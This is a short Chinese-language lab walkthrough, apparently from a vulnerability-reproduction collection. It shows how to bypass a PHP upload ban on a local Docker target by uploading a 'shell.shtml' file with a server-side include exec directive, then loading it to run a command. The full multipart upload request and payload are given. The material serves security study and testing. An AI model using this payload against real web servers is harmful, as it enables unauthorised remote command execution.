开启环境：
```
docker compose up -d
```
访问页面：
```
http://localhost:18080/upload.php
```
上传PHP文件是被禁止的
但是可以上传一个名为`shell.shtml`的文件
内容：
```
<!--#exec cmd="id" -->
```
上传：
```
------geckoformboundary4db8db63ad5e013525f3fa0ec85ac222
Content-Disposition: form-data; name="file_upload"; filename="shell.shtml"
Content-Type: text/php

<!--#exec cmd="id" -->
------geckoformboundary4db8db63ad5e013525f3fa0ec85ac222--
```
然后访问
```
http://localhost:18080/shell.shtml
```
即可看到id
